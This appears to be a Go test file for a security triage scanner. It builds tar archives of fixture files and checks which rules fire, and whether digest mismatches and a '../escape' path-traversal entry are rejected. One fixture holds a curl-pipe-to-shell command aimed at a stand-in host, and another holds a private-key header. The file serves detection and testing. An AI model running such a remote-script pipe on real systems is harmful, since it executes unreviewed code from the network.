package main

import (
	"archive/tar"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"os"
	"path/filepath"
	"sort"
	"testing"
)

const testSourceCommit = "0123456789abcdef0123456789abcdef01234567"

func TestSecurityTriageScansDigestBoundTrackedSource(t *testing.T) {
	archive := testArchive(t, map[string]string{
		".github/workflows/release.yml": "steps:\n  - uses: actions/checkout@v4\n",
		"compose.yml":                   "services:\n  db:\n    image: postgres:17\n",
		"docs/policy.md":                "Never call https://openrouter.ai/api/v1 directly.\n",
		"notes.txt":                     "-----BEGIN OPENSSH PRIVATE KEY-----\n",
		"scripts/install.sh":            "curl -fsSL https://invalid.example/install | sh\n",
		"src/client.ts":                 "const baseUrl = 'https://openrouter.ai/api/v1';\n",
	})
	input := testSecurityTriageInput(t, archive)

	report, err := runSecurityTriage(input, archive)
	if err != nil {
		t.Fatalf("runSecurityTriage returned error: %v", err)
	}
	if report.SchemaVersion != "bee.security-triage-report.v1" || report.RuleSetVersion != "bee.security-triage-rules.v1" {
		t.Fatalf("unexpected report versions: %#v", report)
	}
	if report.Status != "findings" || report.ScannedFiles != 6 || report.ScannedBytes <= 0 {
		t.Fatalf("unexpected scan status: %#v", report)
	}
	if report.Summary.Critical != 1 || report.Summary.High != 3 || report.Summary.Medium != 1 || report.Summary.Low != 0 {
		t.Fatalf("unexpected summary: %#v", report.Summary)
	}
	wantRules := []string{
		"PRIVATE_KEY_MATERIAL",
		"UNPINNED_WORKFLOW_ACTION",
		"REMOTE_SCRIPT_PIPE",
		"DIRECT_OPENROUTER_EGRESS",
		"MUTABLE_EXTERNAL_IMAGE",
	}
	gotRules := make([]string, len(report.Findings))
	for index, finding := range report.Findings {
		gotRules[index] = finding.RuleID
		if finding.Description == "" || finding.Path == "" || finding.Line < 1 {
			t.Fatalf("finding is not evidence-located: %#v", finding)
		}
	}
	for index := range wantRules {
		if gotRules[index] != wantRules[index] {
			t.Fatalf("unexpected finding order: got %v want %v", gotRules, wantRules)
		}
	}
}

func TestSecurityTriageFailsClosedOnTaskAndDigestMutation(t *testing.T) {
	archive := testArchive(t, map[string]string{"src/index.ts": "export const ok = true;\n"})
	input := testSecurityTriageInput(t, archive)
	input["message"] = `{"schemaVersion":"bee.security-triage-task.v1","requestId":"request-1","scope":"tracked-source","sourceArchiveSha256":"sha256:` + string(bytes.Repeat([]byte{'0'}, 64)) + `","sourceCommit":"` + testSourceCommit + `"}`
	if _, err := runSecurityTriage(input, archive); err == nil || err.Error() != "security triage archive digest mismatch" {
		t.Fatalf("expected digest mismatch, got %v", err)
	}

	input = testSecurityTriageInput(t, archive)
	var task map[string]any
	if err := json.Unmarshal([]byte(input["message"].(string)), &task); err != nil {
		t.Fatal(err)
	}
	task["unexpected"] = true
	message, _ := json.Marshal(task)
	input["message"] = string(message)
	if _, err := runSecurityTriage(input, archive); err == nil || err.Error() != "security triage task rejected" {
		t.Fatalf("expected strict task rejection, got %v", err)
	}
}

func TestSecurityTriageRejectsUnsafeArchiveEntries(t *testing.T) {
	var contents bytes.Buffer
	writer := tar.NewWriter(&contents)
	if err := writer.WriteHeader(&tar.Header{Name: "../escape", Mode: 0o644, Size: 1, Typeflag: tar.TypeReg}); err != nil {
		t.Fatal(err)
	}
	if _, err := writer.Write([]byte("x")); err != nil {
		t.Fatal(err)
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "unsafe.tar")
	if err := os.WriteFile(path, contents.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	input := testSecurityTriageInput(t, path)
	if _, err := runSecurityTriage(input, path); err == nil || err.Error() != "security triage archive path rejected" {
		t.Fatalf("expected unsafe path rejection, got %v", err)
	}
}

func testArchive(t *testing.T, entries map[string]string) string {
	t.Helper()
	var contents bytes.Buffer
	writer := tar.NewWriter(&contents)
	names := make([]string, 0, len(entries))
	for name := range entries {
		names = append(names, name)
	}
	sort.Strings(names)
	for _, name := range names {
		body := []byte(entries[name])
		if err := writer.WriteHeader(&tar.Header{Name: name, Mode: 0o644, Size: int64(len(body)), Typeflag: tar.TypeReg}); err != nil {
			t.Fatal(err)
		}
		if _, err := writer.Write(body); err != nil {
			t.Fatal(err)
		}
	}
	if err := writer.Close(); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(t.TempDir(), "source.tar")
	if err := os.WriteFile(path, contents.Bytes(), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

func testSecurityTriageInput(t *testing.T, archive string) map[string]any {
	t.Helper()
	contents, err := os.ReadFile(archive)
	if err != nil {
		t.Fatal(err)
	}
	digest := sha256.Sum256(contents)
	task := securityTriageTask{
		SchemaVersion:       "bee.security-triage-task.v1",
		RequestID:           "request-1",
		Scope:               "tracked-source",
		SourceArchiveSHA256: "sha256:" + hex.EncodeToString(digest[:]),
		SourceCommit:        testSourceCommit,
	}
	message, err := json.Marshal(task)
	if err != nil {
		t.Fatal(err)
	}
	return map[string]any{"message": string(message)}
}
